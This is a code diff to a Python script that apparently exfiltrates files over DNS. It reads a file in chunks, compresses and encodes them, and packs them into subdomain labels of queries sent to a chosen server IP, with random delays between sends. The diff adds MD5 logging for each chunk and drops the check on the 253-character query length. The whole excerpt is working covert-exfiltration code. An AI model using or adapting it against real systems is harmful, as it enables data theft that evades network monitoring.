@@ -48,25 +48,26 @@ def send_dns_query(data, server_ip, max_delay):
     print(f"Query sent, delaying next query by {delay:.2f} seconds.")
     time.sleep(delay)
 
-# Function to send file in compressed and encoded chunks
+def calculate_chunk_md5(chunk_data):
+    md5 = hashlib.md5()
+    md5.update(chunk_data)
+    return md5.hexdigest().upper()
+
 def send_file_chunks(file_path, resolved_ip, domain, max_delay, total_chunks):
-    chunk_size = 64  # Size of each chunk in bytes (adjust as needed)
+    chunk_size = 64  # Reduced chunk size
     
     with open(file_path, "rb") as file:
         for chunk_number in range(total_chunks):
             chunk_data = file.read(chunk_size)
             encoded_chunk_data = compress_and_encode(chunk_data)
 
-            # Break up encoded data into segments to avoid long subdomains (max label size 63 chars)
+            chunk_md5 = calculate_chunk_md5(chunk_data)
+            print(f"Client: MD5 of chunk {chunk_number + 1}: {chunk_md5}")
+
             subdomains = [encoded_chunk_data[i:i+63] for i in range(0, len(encoded_chunk_data), 63)]
             query = f"c{chunk_number}." + ".".join(subdomains) + f".{domain}"
-            print(f"Sending chunk {chunk_number + 1}/{total_chunks}")
 
-            # Check total query length (should be <= 253 characters)
-            if len(query) > 253:
-                print(f"Error: Query length exceeds limit: {len(query)} characters.")
-                continue
-
+            # Send the query here (as before)
             send_dns_query(query, resolved_ip, max_delay)
 
     print("All chunks have been sent successfully.")
